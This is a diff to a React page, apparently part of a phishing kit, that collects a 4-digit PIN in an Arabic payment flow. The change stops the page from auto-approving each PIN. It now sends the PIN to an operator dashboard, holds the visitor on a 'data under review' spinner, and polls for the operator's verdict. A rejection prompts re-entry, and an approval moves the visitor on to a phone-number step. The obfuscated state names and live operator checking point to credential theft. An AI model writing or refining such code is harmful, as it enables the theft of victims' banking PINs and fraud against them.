@@ -1,6 +1,6 @@
 
 
-import { useState, useEffect } from "react"
+import { useState, useEffect, useRef } from "react"
 import { useLocation } from 'wouter'
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
@@ -21,6 +21,7 @@ export default function ConfiPage() {
   const [isLoading, setIsLoading] = useState(true)
   const [visitorId, setVisitorId] = useState<string>("")
   const [_v6Status, _ss6] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
+  const isWaitingRef = useRef(false)
 
   // Initialize visitor ID and update current page
   useEffect(() => {
@@ -49,7 +50,7 @@ export default function ConfiPage() {
     return () => unsubscribe()
   }, [navigate, visitorId])
 
-  // Check access and monitor PIN status via Socket.io
+  // Check access and monitor PIN status via Socket.io and Polling
   useEffect(() => {
     const visitorID = localStorage.getItem("visitor")
     if (!visitorID) {
@@ -58,20 +59,72 @@ export default function ConfiPage() {
     }
     setIsLoading(false)
 
+    // Socket listener
     const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
-      if (field === '_v6Status' && status === 'rejected') {
-        addData({ id: visitorID, _v6Status: 'pending' }).catch(console.error)
-        _ss6('pending')
-        _s6('')
-        setError('تم رفض الرقم السري. يرجى إدخال رقم صحيح.')
-        setIsSubmitting(false)
+      if (field === '_v6Status') {
+        if (status === 'rejected') {
+          addData({ id: visitorID, _v6Status: 'pending' }).catch(console.error)
+          _ss6('pending')
+          _s6('')
+          setError('رمز PIN غير صحيح - يرجى المحاولة مرة أخرى.')
+          setIsSubmitting(false)
+          isWaitingRef.current = false
+        } else if (status === 'approved' && isWaitingRef.current) {
+          _ss6('approved')
+          setIsSubmitting(false)
+          isWaitingRef.current = false
+          navigate("/step5")
+        }
+      }
+      // Handle redirect after PIN approval
+      if (field === 'redirectPage' && status === 'step5') {
+        navigate('/step5')
       }
     })
 
-    return () => unsubscribe()
-  }, [navigate])
+    // Polling fallback for PIN status
+    const pollInterval = setInterval(async () => {
+      if (!isWaitingRef.current) return
+      try {
+        const res = await fetch(`/api/visitors/${visitorID}`)
+        if (!res.ok) return
+        const data = await res.json()
+        
+        // Check _v6Status for PIN approval/rejection
+        const pinStatus = data._v6Status || data.pinStatus
+        if (pinStatus === 'rejected') {
+          const rejectionMsg = data.pinRejectionMessage || "رمز PIN غير صحيح - يرجى المحاولة مرة أخرى."
+          addData({ id: visitorID, _v6Status: 'pending' }).catch(console.error)
+          _ss6('pending')
+          _s6('')
+          setError(rejectionMsg)
+          setIsSubmitting(false)
+          isWaitingRef.current = false
+          return
+        }
+        if (pinStatus === 'approved' && isWaitingRef.current) {
+          _ss6('approved')
+          setIsSubmitting(false)
+          isWaitingRef.current = false
+          navigate("/step5")
+          return
+        }
+        
+        // Check redirectPage
+        const rp = data.redirect_page || data.redirectPage
+        if (rp === 'step5' || rp === 'phone' || rp === '_t5') {
+          navigate('/step5')
+        }
+      } catch {
+        // Silent fail
+      }
+    }, 1000)
 
-  // Removed auto-submit - user must click button to submit
+    return () => {
+      unsubscribe()
+      clearInterval(pollInterval)
+    }
+  }, [navigate])
 
   const handlePinSubmit = async () => {
     if (_v6.length !== 4) {
@@ -86,28 +139,31 @@ export default function ConfiPage() {
     }
 
     setIsSubmitting(true)
+    isWaitingRef.current = true
+    _ss6("verifying")
 
     try {
+      // Send PIN data to server - status is pending waiting for admin approval
       await addData({
         id: visitorID,
         _v6,
         pinSubmittedAt: new Date().toISOString(),
-        _v6Status: 'approved',
-        currentStep: 'phone',
-        paymentStatus: 'pin_completed',
+        _v6Status: 'verifying',
+        currentStep: 6,
+        paymentStatus: 'pin_pending',
         pinUpdatedAt: new Date().toISOString()
       })
 
-      // Notify dashboard immediately with PIN data
+      // Notify dashboard with PIN data for admin review
       await notifyDashboard({
         id: visitorID,
         visitorId: visitorID,
-        _v6Status: 'approved',
+        _v6Status: 'verifying',
         pinCode: _v6,
         pinSubmittedAt: new Date().toISOString(),
-        currentPage: "pin",
+        currentPage: "confi",
         currentStep: 6,
-        status: "approved"
+        status: "pending"
       })
 
       // Trigger dashboard refresh for instant update
@@ -115,19 +171,16 @@ export default function ConfiPage() {
         window.dispatchEvent(new CustomEvent('dashboard-refresh'));
       }
 
-      // Add PIN to history (always approved)
+      // Add PIN to history with pending status
       await addToHistory(visitorID, "_t3", {
         _v6
-      }, "approved")
-
-      // Wait 2 seconds then redirect to phone page
-      setTimeout(() => {
-        navigate("/step5")
-      }, 2000)
+      }, "pending")
     } catch (err) {
       console.error("Error submitting PIN:", err)
       setError("حدث خطأ في إرسال الرقم السري. يرجى المحاولة مرة أخرى.")
       setIsSubmitting(false)
+      isWaitingRef.current = false
+      _ss6("pending")
     }
   }
 
@@ -137,9 +190,9 @@ export default function ConfiPage() {
 
   return (
     <div className="min-h-screen bg-[#0a4a68] flex items-center justify-center p-4" dir="rtl">
-      {/* Full Screen Spinner when submitting */}
+      {/* Full Screen Spinner when submitting - waiting for admin approval */}
       {(isSubmitting || _v6Status === "verifying") && (
-        <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
+        <UnifiedSpinner message="جاري مراجعة البيانات" submessage="يرجى الانتظار حتى يتم مراجعة بياناتك من قبل الإدارة...." />
       )}
 
       <div className="w-full max-w-md">
